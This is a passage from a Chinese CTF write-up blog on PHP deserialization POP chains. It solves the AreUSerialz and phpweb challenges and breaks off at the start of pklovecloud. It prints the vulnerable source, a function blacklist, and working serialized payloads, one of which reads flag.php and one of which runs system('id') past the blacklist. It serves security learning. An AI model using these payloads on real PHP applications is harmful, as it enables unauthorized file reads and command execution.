invoke__">__invoke</span>() <span class="hljs-comment">// 当尝试以调用函数的方法调用一个对象时, 会被自动调用</span><br><span class="hljs-title function_ invoke__">__call</span>() <span class="hljs-comment">// 在对象上下文中调用不可访问的方法时触发</span><br><span class="hljs-title function_ invoke__">__callStatci</span>() <span class="hljs-comment">// 在静态上下文中调用不可访问的方法时触发</span><br><span class="hljs-title function_ invoke__">__get</span>() <span class="hljs-comment">// 用于从不可访问的属性读取数据</span><br><span class="hljs-title function_ invoke__">__set</span>() <span class="hljs-comment">// 用于将数据写入不可访问的属性</span><br><span class="hljs-title function_ invoke__">__isset</span>() <span class="hljs-comment">// 在不可访问的属性上调用 isset()或 empty()触发</span><br><span class="hljs-title function_ invoke__">__unset</span>() <span class="hljs-comment">// 在不可访问的属性上使用 unset()时触发</span><br><span class="hljs-title function_ invoke__">__toString</span>() <span class="hljs-comment">// 把类当作字符串使用时触发</span><br><span class="hljs-title function_ invoke__">__sleep</span>() <span class="hljs-comment">// serialize()函数会检查类中是否存在一个魔术方法 __sleep() 如果存在，该方法会被优先调用</span><br></code></pre></td></tr></table></figure><h2 id="POP链构造"><a href="#POP链构造" class="headerlink" title="POP链构造"></a>POP链构造</h2><p>POP 链就是利用魔术方法进行反序列化漏洞利用的一种 <code>Payload</code>，之前还以为是 PHP 反序列化类似原生类的另一种姿势，后来才知道魔术方法的利用就是 POP 链。</p><p>这里用 3 道 CTF 的题目来学习 POP 链的构造。</p><p>CTF：<a href="https://www.ctfhub.com/">https://www.ctfhub.com/</a></p><p>题目：</p><ol><li>2020-网鼎杯-青龙组-Web-AreUSerialz （ 难度 4.9 ）</li><li>2020-网鼎杯-朱雀组-Web-phpweb （ 难度 5.2 ）</li><li>2021-第五空间智能安全大赛-Web-pklovecloud （ 难度 5.4 ）</li></ol><h3 id="Web-AreUSerialz"><a href="#Web-AreUSerialz" class="headerlink" title="Web-AreUSerialz"></a>Web-AreUSerialz</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$op</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$content</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$op</span> = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;/tmp/tmpfile&quot;</span>;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">process</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;1&quot;</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>();<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;2&quot;</span>) &#123;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>();<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-variable">$res</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Bad Hacker!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;content)) &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable language_">$this</span>-&gt;content) &gt; <span class="hljs-number">100</span>) &#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Too long!&quot;</span>);<br>                <span class="hljs-keyword">die</span>();<br>            &#125;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename, <span class="hljs-variable">$this</span>-&gt;content);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>) <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Successful!&quot;</span>);<br>            <span class="hljs-keyword">else</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename)) &#123;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">output</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[Result]: &lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$s</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op === <span class="hljs-string">&quot;2&quot;</span>)<br>            <span class="hljs-variable language_">$this</span>-&gt;op = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$s</span>); <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &gt;= <span class="hljs-number">32</span> &amp;&amp; <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &lt;= <span class="hljs-number">125</span>))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>&#123;<span class="hljs-string">&#x27;str&#x27;</span>&#125;)) &#123;<br><br>    <span class="hljs-variable">$str</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;str&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$str</span>)) &#123;<br>        <span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$str</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>先看参数的传递：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// GET &#x27;str&#x27; 传参</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>&#123;<span class="hljs-string">&#x27;str&#x27;</span>&#125;)) &#123;<br>    <span class="hljs-variable">$str</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;str&#x27;</span>];<br>    <span class="hljs-comment">// 使用 is_valid() 判断, 为 true 则进行反序列化操作</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$str</span>)) &#123;<br>        <span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$str</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>看一下 <code>is_valid()</code> 函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 判断字符串是否为可打印字符(正常的字符)</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$s</span>); <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-comment">// ord() 将字符产转换为 ASCII 值</span><br>        <span class="hljs-comment">// 32 ~ 125 代表着 &quot;可打印字符&quot; 也就是常见的字母、数字、符号</span><br>        <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &gt;= <span class="hljs-number">32</span> &amp;&amp; <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &lt;= <span class="hljs-number">125</span>))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里需要注意的是 “私有&#x2F;受保护” 的属性被序列化后都会有”空字节”这个不可见字符，发现上面的类中的属性都是 <code>protected</code> ，那就得绕过一下了。</p><p>绕过方法就简单了，直接修改 <code>protected</code> 为 <code>public</code> 就行 ( php7.1以上的版本对属性类型不敏感 ) 。</p><p>知道如何传递参数后，接下来就是寻找类中存在的”危险函数”，然后构造 POP 链去利用它。</p><p>其中危险函数有：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">read</span>() --&gt; <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename)<span class="hljs-comment">// 读取文件( 读取 flag.php )</span><br><span class="hljs-title function_ invoke__">write</span>() --&gt; <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename, <span class="hljs-variable">$this</span>-&gt;content)<span class="hljs-comment">// 写入文件( 写入 webshell )</span><br></code></pre></td></tr></table></figure><p>接下来就是在类中寻找调用了它们的地方，直接搜索一下：</p><p>发现在 <code>process()</code> 中调用了它们两个，条件是 <code>$op</code> 参数，还是弱类型比较，比较好绕过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">process</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;1&quot;</span>) &#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>();<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;2&quot;</span>) &#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>();<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-variable">$res</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Bad Hacker!&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>再来看一下哪里调用了 <code>process()</code> ？</p><p>两个地方，一个构造函数，一个析构函数。</p><p>构造函数是用来写入文件的，但是我们在利用反序列化漏洞的时候，直接传入一个序列化后的字符串，然后程序使用 <code>unserialize()</code> 函数对其进行反序列化操作，服务端反序列化的整个过程中其实并没有去利用 <code>__construct()</code> 函数，所以自然无法利用它去写 shell。</p><p>那么目标就是析构函数了，看下析构函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-comment">// if 简写的, 没加&#123;&#125;, 这里给加上</span><br>    <span class="hljs-comment">// 强类型比较 $op 是字符串2 时, 将 $op 设置为 字符串1, 不是字符串2时, 执行下面的代码</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op === <span class="hljs-string">&quot;2&quot;</span>)&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;op = <span class="hljs-string">&quot;1&quot;</span>;<br>    &#125;<br>    <span class="hljs-variable language_">$this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-comment">// 执行 process()</span><br>    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>这里是有一个强类型比较为字符2，等于的话就赋值为1，上面的要弱类型等于字符2就执行 <code>read()</code>。</p><p>这样一叠加，直接让 <code>$op</code> 等于数字 2，就完美的解决了问题。</p><p>链条已经构造好了，之前是反着推的，现在正着写一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">__destruct</span>() --&gt; <span class="hljs-title function_ invoke__">process</span>() --&gt; <span class="hljs-title function_ invoke__">read</span>()<br></code></pre></td></tr></table></figure><p>下面就直接构造 Payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$op</span> = <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;flag.php&quot;</span>;<br>    &#125;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileHandler</span>();<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">?<span class="hljs-built_in">str</span>=O:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;FileHandler&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;op&quot;</span>;i:<span class="hljs-number">2</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;filename&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;flag.php&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><h3 id="Web-phpweb"><a href="#Web-phpweb" class="headerlink" title="Web-phpweb"></a>Web-phpweb</h3><p>前端发现，有隐藏的标签。又发现隔一会就会刷新页面，发生请求。抓包看下请求：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230526202945051.png" alt="image-20230526202945051"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">func=date&amp;p=Y-m-d+h%<span class="hljs-number">3</span>Ai%<span class="hljs-number">3</span>As+a<br></code></pre></td></tr></table></figure><p><code>fucn</code> 可能是函数，<code>p</code> 应该是函数参数。</p><p>测试一下命令执行：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230526203058343.png" alt="image-20230526203058343"></p><p>应该是有过滤的，而且这题是反序列化，应该是需要进行白盒审计。那就读取文件：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">func=file_get_contents&amp;p=index.php<br></code></pre></td></tr></table></figure><p>获取到源码开始审计，找传参和危险函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>   <span class="hljs-variable">$disable_fun</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-string">&quot;shell_exec&quot;</span>,<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-string">&quot;passthru&quot;</span>,<span class="hljs-string">&quot;proc_open&quot;</span>,<span class="hljs-string">&quot;show_source&quot;</span>,<span class="hljs-string">&quot;phpinfo&quot;</span>,<span class="hljs-string">&quot;popen&quot;</span>,<span class="hljs-string">&quot;dl&quot;</span>,<span class="hljs-string">&quot;eval&quot;</span>,<span class="hljs-string">&quot;proc_terminate&quot;</span>,<span class="hljs-string">&quot;touch&quot;</span>,<br>     <span class="hljs-string">&quot;escapeshellcmd&quot;</span>,<span class="hljs-string">&quot;escapeshellarg&quot;</span>,<span class="hljs-string">&quot;assert&quot;</span>,<span class="hljs-string">&quot;substr_replace&quot;</span>,<span class="hljs-string">&quot;call_user_func_array&quot;</span>,<span class="hljs-string">&quot;call_user_func&quot;</span>,<span class="hljs-string">&quot;array_filter&quot;</span>, <span class="hljs-string">&quot;array_walk&quot;</span>,<br>     <span class="hljs-string">&quot;array_map&quot;</span>,<span class="hljs-string">&quot;registregister_shutdown_function&quot;</span>,<span class="hljs-string">&quot;register_tick_function&quot;</span>,<span class="hljs-string">&quot;filter_var&quot;</span>, <span class="hljs-string">&quot;filter_var_array&quot;</span>, <span class="hljs-string">&quot;uasort&quot;</span>, <span class="hljs-string">&quot;uksort&quot;</span>, <span class="hljs-string">&quot;array_reduce&quot;</span>,<br>     <span class="hljs-string">&quot;array_walk&quot;</span>, <span class="hljs-string">&quot;array_walk_recursive&quot;</span>,<span class="hljs-string">&quot;pcntl_exec&quot;</span>,<span class="hljs-string">&quot;fopen&quot;</span>,<span class="hljs-string">&quot;fwrite&quot;</span>,<span class="hljs-string">&quot;file_put_contents&quot;</span><br>   );<br><span class="hljs-comment">// 3. 存在代码执行</span><br>   <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gettime</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span></span>) </span>&#123;<br>     <span class="hljs-comment">// $func 作为回调函数使用, 其他参数作为函数参数</span><br>     <span class="hljs-comment">// 代码执行</span><br>     <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span>);<br>     <span class="hljs-comment">// 获取结果类型, string 就返回结果</span><br>     <span class="hljs-variable">$a</span>= <span class="hljs-title function_ invoke__">gettype</span>(<span class="hljs-variable">$result</span>);<br>     <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> == <span class="hljs-string">&quot;string&quot;</span>) &#123;<br>       <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>     &#125; <span class="hljs-keyword">else</span> &#123;<br>       <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>     &#125;<br>   &#125;<br>   <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>     <span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;Y-m-d h:i:s a&quot;</span>;<br>     <span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;date&quot;</span>;<br>     <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>       <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;func != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>         <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettime</span>(<span class="hljs-variable">$this</span>-&gt;func, <span class="hljs-variable">$this</span>-&gt;p);<br>       &#125;<br>     &#125;<br>   &#125;<br><span class="hljs-comment">// 1. 参数传递</span><br>   <span class="hljs-variable">$func</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;func&quot;</span>];<br>   <span class="hljs-variable">$p</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;p&quot;</span>];<br>   <span class="hljs-keyword">if</span> (<span class="hljs-variable">$func</span> != <span class="hljs-literal">null</span>) &#123;<br>     <span class="hljs-variable">$func</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$func</span>);<br>     <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$func</span>,<span class="hljs-variable">$disable_fun</span>)) &#123;<span class="hljs-comment">// 2. 黑名单判断</span><br>       <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettime</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span>);<span class="hljs-comment">// 3. 存在代码执行漏洞</span><br>     &#125;<span class="hljs-keyword">else</span> &#123;<br>       <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Hacker...&quot;</span>);<br>     &#125;<br>   &#125;<br> <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>直接存在代码执行，但是能执行命令的都在黑名单里面。</p><p>而调用 <code>gettime()</code> 的位置有 2 处，第一处后黑名单过滤，第二处在 <code>Test</code> 类的 <code>__destruct</code> 函数中。<code>unserialize</code> 也没有被过滤，可以利用 <code>unserialize</code> 绕过黑名单，然后利用  <code>__destruct</code>  进行代码执行。</p><p>构造 Payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>      <span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;id&quot;</span>;<br>      <span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;system&quot;</span>;<br>    &#125;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urldecode</span>(@<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230526204543155.png" alt="image-20230526204543155"></p><p>接下来读取 flag 即可：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230526204911440.png" alt="image-20230526204911440"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230526204947657.png" alt="image-20230526204947657"></p><h3 id="Web-pklovecloud"><a href="#Web-pklovecloud" class="headerlink" title="Web-pklovecloud"></a>Web-pklovecloud</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 